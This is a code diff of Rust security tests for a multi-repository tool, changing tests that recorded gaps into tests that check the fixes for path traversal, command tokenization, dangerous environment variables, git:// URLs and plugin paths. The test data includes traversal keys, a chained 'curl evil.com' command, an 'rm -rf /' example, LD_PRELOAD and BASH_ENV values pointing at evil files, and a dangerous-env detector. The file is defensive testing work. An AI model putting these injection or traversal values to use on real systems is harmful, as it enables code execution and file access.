@@ -123,15 +123,11 @@ mod command_injection {
 mod path_traversal {
     use super::*;
 
-    /// MetaConfig allows project keys with path traversal sequences.
-    /// This test documents the current behavior — keys are stored as-is
-    /// in the HashMap without validation.
-    ///
-    /// SECURITY GAP: project keys like "../../etc" are accepted and later
-    /// used in base_path.join(project_name) without canonicalization.
-    /// Tracked by issue #11 (config validation).
+    /// Fixed by #11: MetaConfig::load_from_file drops project entries whose
+    /// key contains path-traversal sequences. The entry is removed before any
+    /// plugin code can join it onto base_path.
     #[test]
-    fn config_accepts_traversal_in_project_keys() {
+    fn config_rejects_traversal_in_project_keys_on_load() {
         let tmp = TempDir::new().unwrap();
         let meta_path = tmp.path().join(".meta");
 
@@ -140,14 +136,21 @@ mod path_traversal {
             "../../etc/evil".to_string(),
             ProjectEntry::Url("https://github.com/user/repo.git".to_string()),
         );
+        config.projects.insert(
+            "safe-project".to_string(),
+            ProjectEntry::Url("https://github.com/user/repo.git".to_string()),
+        );
 
         config.save_to_file(&meta_path).unwrap();
         let loaded = MetaConfig::load_from_file(&meta_path).unwrap();
 
-        // CURRENT BEHAVIOR: traversal key is accepted without validation
         assert!(
-            loaded.projects.contains_key("../../etc/evil"),
-            "Path traversal key is currently accepted (no validation)"
+            !loaded.projects.contains_key("../../etc/evil"),
+            "Traversal key must be dropped on load"
+        );
+        assert!(
+            loaded.projects.contains_key("safe-project"),
+            "Safe keys must survive sanitization"
         );
     }
 
@@ -282,30 +285,23 @@ mod config_safety {
         assert!(loaded.projects.contains_key(&long_key));
     }
 
-    /// Script commands from config are split by whitespace and passed to
-    /// Command::new(). Verify that the split_whitespace approach preserves
-    /// shell metacharacters as literal tokens.
-    ///
-    /// SECURITY GAP: While Command::new doesn't invoke a shell, the naive
-    /// split_whitespace means quoted arguments with spaces won't work
-    /// correctly, and a malicious script value like "rm -rf /" would
-    /// execute rm with args ["-rf", "/"]. The config is user-editable,
-    /// so this is a trust-boundary concern. Tracked by issue #14.
+    /// Fixed by #14: script commands are tokenized with shlex so quoted args
+    /// containing spaces are preserved as single tokens.
     #[test]
-    fn script_command_split_whitespace_behavior() {
-        // Simulate what run_script does: split a script command
-        let script_cmd = "npm run test && curl evil.com";
-        let parts: Vec<&str> = script_cmd.split_whitespace().collect();
+    fn script_command_uses_shlex_tokenization() {
+        let script_cmd = "cargo test --arg \"value with spaces\"";
+        let parts = shlex::split(script_cmd).expect("balanced quotes");
+        assert_eq!(parts.len(), 4);
+        assert_eq!(parts[0], "cargo");
+        assert_eq!(parts[3], "value with spaces");
+    }
 
-        // split_whitespace produces literal tokens — && is just a string token
-        assert_eq!(parts[0], "npm");
-        assert_eq!(parts[3], "&&");
-        assert_eq!(parts[4], "curl");
-
-        // When passed to Command::new("npm").args(&["run", "test", "&&", "curl", "evil.com"]),
-        // "&&" is a literal argument to npm, NOT a shell operator.
-        // This is safe for Command but could be confusing if the user expected
-        // shell behavior. The real danger is that parts[0] is used as the executable.
+    /// Unbalanced quotes are surfaced as an error instead of silently
+    /// producing wrong tokens.
+    #[test]
+    fn script_command_rejects_unbalanced_quotes() {
+        let script_cmd = "echo \"unbalanced";
+        assert!(shlex::split(script_cmd).is_none());
     }
 
     /// Verify that a script config value with just whitespace produces
@@ -392,30 +388,54 @@ mod config_safety {
         );
     }
 
-    /// Environment variables from config are passed to child processes
-    /// without filtering. Verify that dangerous env vars (LD_PRELOAD, etc.)
-    /// are stored in config without any blocklist.
-    ///
-    /// SECURITY GAP: No env var blocklist exists. Tracked by issue #11.
+    /// Fixed by #11: MetaConfig::load_from_file strips known dangerous env
+    /// vars from each project entry so they cannot be forwarded to child
+    /// processes via cmd.env(...).
     #[test]
-    fn env_vars_not_filtered_in_config() {
+    fn dangerous_env_vars_stripped_on_load() {
+        let tmp = TempDir::new().unwrap();
+        let meta_path = tmp.path().join(".meta");
+
         let mut env = HashMap::new();
         env.insert("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string());
         env.insert("BASH_ENV".to_string(), "/tmp/evil.sh".to_string());
+        env.insert("PATH".to_string(), "/usr/local/bin".to_string());
 
-        let config_entry = ProjectMetadata {
-            url: "https://github.com/user/repo.git".to_string(),
-            aliases: vec![],
-            scripts: HashMap::new(),
-            env,
-            worktree_init: None,
-            bare: None,
+        let mut config = MetaConfig::default();
+        config.projects.insert(
+            "p".to_string(),
+            ProjectEntry::Metadata(ProjectMetadata {
+                url: "https://github.com/user/repo.git".to_string(),
+                aliases: vec![],
+                scripts: HashMap::new(),
+                env,
+                worktree_init: None,
+                bare: None,
+            }),
+        );
+        config.save_to_file(&meta_path).unwrap();
+
+        let loaded = MetaConfig::load_from_file(&meta_path).unwrap();
+        let entry = loaded.projects.get("p").unwrap();
+        let env = match entry {
+            ProjectEntry::Metadata(m) => &m.env,
+            _ => panic!("expected metadata entry"),
         };
+        assert!(
+            !env.contains_key("LD_PRELOAD"),
+            "LD_PRELOAD must be stripped"
+        );
+        assert!(!env.contains_key("BASH_ENV"), "BASH_ENV must be stripped");
+        assert!(env.contains_key("PATH"), "innocuous vars survive");
+    }
 
-        // CURRENT BEHAVIOR: dangerous env vars are stored and would be
-        // passed to child processes via cmd.env(key, value)
-        assert!(config_entry.env.contains_key("LD_PRELOAD"));
-        assert!(config_entry.env.contains_key("BASH_ENV"));
+    #[test]
+    fn dangerous_env_helper_recognizes_known_keys() {
+        use metarepo_core::is_dangerous_env_var;
+        assert!(is_dangerous_env_var("LD_PRELOAD"));
+        assert!(is_dangerous_env_var("DYLD_INSERT_LIBRARIES"));
+        assert!(is_dangerous_env_var("NODE_OPTIONS"));
+        assert!(!is_dangerous_env_var("PATH"));
     }
 }
 
@@ -454,18 +474,19 @@ mod url_validation {
         }
     }
 
-    /// SECURITY GAP: git:// protocol (unauthenticated, unencrypted) is not
-    /// explicitly handled — it falls through to the "local path" branch.
-    /// Tracked by issue #13.
+    /// Fixed by #13: the centralized helper recognizes git:// as a URL scheme
+    /// (and flags it as unencrypted so callers can warn).
     #[test]
-    fn git_protocol_not_detected_as_url() {
-        let input = "git://github.com/user/repo.git";
-        let is_url =
-            input.starts_with("http") || input.starts_with("git@") || input.starts_with("ssh://");
-        assert!(
-            !is_url,
-            "git:// protocol is not detected as a URL — falls through to local path handling"
-        );
+    fn git_protocol_is_detected_as_url() {
+        use metarepo_core::{is_supported_git_url, is_unencrypted_git_scheme};
+        assert!(is_supported_git_url("git://github.com/user/repo.git"));
+        assert!(is_unencrypted_git_scheme("git://github.com/user/repo.git"));
+        assert!(!is_unencrypted_git_scheme(
+            "https://github.com/user/repo.git"
+        ));
+        // file:// is still NOT treated as a remote URL — it falls through to
+        // local-path handling, which now goes through validate_path_segment.
+        assert!(!is_supported_git_url("file:///etc/passwd"));
     }
 
     /// Verify that MetaConfig stores arbitrary URL strings without validation.
@@ -510,48 +531,36 @@ mod plugin_safety {
         );
     }
 
-    /// ExternalPlugin::load accepts absolute paths outside the plugins
-    /// directory. There is no path validation.
-    ///
-    /// SECURITY GAP: Any path can be passed to ExternalPlugin::load.
-    /// No check ensures the path is within the expected plugins directory.
-    /// Tracked by issue #12.
+    /// Fixed by #12: ExternalPlugin::load rejects paths outside the allowed
+    /// plugin directories. /bin/echo is not under a metarepo plugin root, so
+    /// validation fails before spawn.
     #[test]
-    fn plugin_load_accepts_absolute_paths() {
-        // /bin/echo exists and is executable, but it doesn't speak the
-        // plugin protocol, so it will fail at the protocol level —
-        // the important thing is that path validation doesn't reject it.
+    fn plugin_load_rejects_path_outside_allowed_roots() {
         let result = metarepo::plugins::ExternalPlugin::load(Path::new("/bin/echo"));
-
-        // It will fail because /bin/echo doesn't respond with the plugin protocol,
-        // NOT because the path is rejected. This documents the gap:
-        // there is no path validation before spawning.
-        let err_msg = match result {
-            Ok(_) => panic!("/bin/echo should not load successfully as a plugin"),
-            Err(e) => e.to_string(),
+        let err = match result {
+            Ok(_) => panic!("/bin/echo must be rejected by path validation"),
+            Err(e) => e,
         };
-
-        // The error should be about protocol, not "path not allowed"
+        let msg = err.to_string();
         assert!(
-            !err_msg.contains("not allowed") && !err_msg.contains("invalid path"),
-            "Error should be protocol-related, not path-related — no path validation exists. Got: {}",
-            err_msg
+            msg.contains("not in an allowed plugins directory") || msg.contains("does not exist"),
+            "Expected path-policy rejection, got: {}",
+            msg
         );
     }
 
-    /// Verify that plugin paths with traversal sequences are not rejected.
-    ///
-    /// SECURITY GAP: No traversal check on plugin paths. Tracked by issue #12.
+    /// Fixed by #12: plugin paths containing `..` are rejected outright.
     #[test]
-    fn plugin_load_does_not_reject_traversal_paths() {
-        // Attempt to load a plugin with ../ in the path
+    fn plugin_load_rejects_traversal_paths() {
         let result = metarepo::plugins::ExternalPlugin::load(Path::new("../../../usr/bin/true"));
-
-        // Will fail because /usr/bin/true doesn't speak plugin protocol,
-        // but the path itself is not rejected
+        let err = match result {
+            Ok(_) => panic!("traversal path must be rejected"),
+            Err(e) => e,
+        };
         assert!(
-            result.is_err(),
-            "Should fail, but at protocol or spawn level, not path validation"
+            err.to_string().contains("'..'"),
+            "Expected traversal rejection, got: {}",
+            err
         );
     }
 }
